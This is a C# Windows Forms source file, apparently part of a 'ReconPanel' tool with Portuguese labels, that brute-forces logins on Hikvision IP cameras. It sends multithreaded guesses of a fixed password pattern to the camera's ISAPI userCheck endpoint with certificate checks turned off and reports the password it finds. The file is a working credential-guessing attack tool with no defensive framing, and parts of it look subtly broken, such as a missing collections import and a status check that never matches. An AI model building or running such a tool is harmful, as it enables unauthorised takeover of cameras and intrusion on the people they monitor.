using System;
using System.Drawing;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ReconPanel;

public class BruteForceControl : UserControl
{
    private TextBox txtIp;
    private TextBox txtUser;
    private NumericUpDown numStart;
    private NumericUpDown numEnd;
    private NumericUpDown numThreads;
    private Button btnStart;
    private Button btnStop;
    private ProgressBar progress;
    private TextBox txtLog;
    private Label lblStatus;
    private CancellationTokenSource? cts;

    public BruteForceControl()
    {
        BackColor = Color.FromArgb(30, 30, 30);
        Padding = new Padding(20);
        BuildUI();
    }

    private void BuildUI()
    {
        var layout = new TableLayoutPanel
        {
            Dock = DockStyle.Top,
            AutoSize = true,
            ColumnCount = 2,
            RowCount = 6,
            Padding = new Padding(10)
        };

        // IP
        layout.Controls.Add(CreateLabel("IP Câmera:"), 0, 0);
        txtIp = CreateTextBox("192.168.1.64");
        layout.Controls.Add(txtIp, 1, 0);

        // Usuário
        layout.Controls.Add(CreateLabel("Usuário:"), 0, 1);
        txtUser = CreateTextBox("admin");
        layout.Controls.Add(txtUser, 1, 1);

        // Range início
        layout.Controls.Add(CreateLabel("Número inicial:"), 0, 2);
        numStart = new NumericUpDown { Minimum = 0, Maximum = 9999, Value = 0, Width = 120, BackColor = Color.FromArgb(50,50,50), ForeColor = Color.White };
        layout.Controls.Add(numStart, 1, 2);

        // Range fim
        layout.Controls.Add(CreateLabel("Número final:"), 0, 3);
        numEnd = new NumericUpDown { Minimum = 0, Maximum = 9999, Value = 999, Width = 120, BackColor = Color.FromArgb(50,50,50), ForeColor = Color.White };
        layout.Controls.Add(numEnd, 1, 3);

        // Threads
        layout.Controls.Add(CreateLabel("Threads:"), 0, 4);
        numThreads = new NumericUpDown { Minimum = 1, Maximum = 50, Value = 10, Width = 120, BackColor = Color.FromArgb(50,50,50), ForeColor = Color.White };
        layout.Controls.Add(numThreads, 1, 4);

        // Botões
        var btnPanel = new FlowLayoutPanel { AutoSize = true };
        btnStart = new Button
        {
            Text = "Iniciar",
            BackColor = Color.FromArgb(0, 150, 0),
            ForeColor = Color.White,
            Size = new Size(100, 35),
            FlatStyle = FlatStyle.Flat
        };
        btnStart.Click += BtnStart_Click;

        btnStop = new Button
        {
            Text = "Parar",
            BackColor = Color.FromArgb(180, 0, 0),
            ForeColor = Color.White,
            Size = new Size(100, 35),
            FlatStyle = FlatStyle.Flat,
            Enabled = false
        };
        btnStop.Click += BtnStop_Click;

        btnPanel.Controls.Add(btnStart);
        btnPanel.Controls.Add(btnStop);
        layout.Controls.Add(btnPanel, 1, 5);

        // Status
        lblStatus = new Label
        {
            Text = "Parado",
            ForeColor = Color.Gray,
            AutoSize = true,
            Dock = DockStyle.Top,
            Padding = new Padding(10, 0, 0, 5)
        };

        // Progress
        progress = new ProgressBar
        {
            Dock = DockStyle.Top,
            Height = 20,
            Style = ProgressBarStyle.Continuous
        };

        // Log
        txtLog = new TextBox
        {
            Multiline = true,
            ReadOnly = true,
            ScrollBars = ScrollBars.Vertical,
            BackColor = Color.FromArgb(20, 20, 20),
            ForeColor = Color.LightGreen,
            Font = new Font("Consolas", 9F),
            Dock = DockStyle.Fill
        };

        Controls.Add(txtLog);
        Controls.Add(progress);
        Controls.Add(lblStatus);
        Controls.Add(layout);
    }

    private Label CreateLabel(string text)
    {
        return new Label
        {
            Text = text,
            ForeColor = Color.White,
            AutoSize = true,
            Anchor = AnchorStyles.Left | AnchorStyles.Right
        };
    }

    private TextBox CreateTextBox(string defaultText)
    {
        return new TextBox
        {
            Text = defaultText,
            BackColor = Color.FromArgb(50, 50, 50),
            ForeColor = Color.White,
            BorderStyle = BorderStyle.FixedSingle,
            Width = 250
        };
    }

    private void BtnStart_Click(object? sender, EventArgs e)
    {
        if (string.IsNullOrWhiteSpace(txtIp.Text)) return;

        cts = new CancellationTokenSource();
        btnStart.Enabled = false;
        btnStop.Enabled = true;
        lblStatus.Text = "Executando...";
        lblStatus.ForeColor = Color.Orange;
        txtLog.Clear();

        int start = (int)numStart.Value;
        int end = (int)numEnd.Value;
        int threads = (int)numThreads.Value;
        string ip = txtIp.Text.Trim();
        string user = txtUser.Text.Trim();

        progress.Maximum = end - start + 1;
        progress.Value = 0;

        _ = Task.Run(() => RunBruteForce(ip, user, start, end, threads, cts.Token));
    }

    private void BtnStop_Click(object? sender, EventArgs e)
    {
        cts?.Cancel();
        btnStart.Enabled = true;
        btnStop.Enabled = false;
        lblStatus.Text = "Parado";
        lblStatus.ForeColor = Color.Red;
    }

    private async Task RunBruteForce(string ip, string user, int start, int end, int threads, CancellationToken ct)
    {
        var handler = new HttpClientHandler
        {
            ServerCertificateCustomValidationCallback = (_, _, _, _) => true
        };
        using var http = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(5) };

        int total = end - start + 1;
        int current = 0;
        var semaphore = new SemaphoreSlim(threads);
        var tasks = new List<Task>();

        for (int i = start; i <= end; i++)
        {
            if (ct.IsCancellationRequested) break;

            int num = i;
            await semaphore.WaitAsync(ct);

            tasks.Add(Task.Run(async () =>
            {
                try
                {
                    string pass = $"zZeElLaA@{num:D3}";
                    bool found = await TryLogin(http, ip, user, pass);

                    Invoke(() =>
                    {
                        progress.Value = Math.Min(++current, total);
                        txtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {user}:{pass} → {(found ? "OK!" : "falha")}{Environment.NewLine}");
                        txtLog.ScrollToCaret();

                        if (found)
                        {
                            cts?.Cancel();
                            lblStatus.Text = $"SENHA ENCONTRADA: {pass}";
                            lblStatus.ForeColor = Color.Lime;
                            MessageBox.Show($"Senha encontrada!\n\nUsuário: {user}\nSenha: {pass}", "Sucesso", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    });
                }
                catch { }
                finally
                {
                    semaphore.Release();
                }
            }, ct));
        }

        await Task.WhenAll(tasks);

        Invoke(() =>
        {
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            if (lblStatus.Text != "SENHA ENCONTRADA")
            {
                lblStatus.Text = "Concluído";
                lblStatus.ForeColor = Color.Gray;
            }
        });
    }

    private async Task<bool> TryLogin(HttpClient http, string ip, string user, string pass)
    {
        try
        {
            // Tenta API ISAPI Hikvision
            string url = $"http://{ip}/ISAPI/Security/userCheck";
            var content = new StringContent(
                $"<?xml version=\"1.0\" encoding=\"UTF-8\"?><UserCheck><userName>{user}</userName><password>{pass}</password></UserCheck>",
                Encoding.UTF8, "application/xml");

            var resp = await http.PostAsync(url, content);
            string body = await resp.Content.ReadAsStringAsync();

            if (resp.StatusCode == System.Net.HttpStatusCode.OK && body.Contains("userCheckResult"))
            {
                return body.Contains("OK") || body.Contains("success");
            }

            // Fallback: tenta login HTTP básico
            var basic = new StringContent($"userName={user}&password={pass}");
            var resp2 = await http.PostAsync($"http://{ip}/ISAPI/Security/userCheck", basic);
            return resp2.StatusCode == System.Net.HttpStatusCode.OK;
        }
        catch
        {
            return false;
        }
    }
}
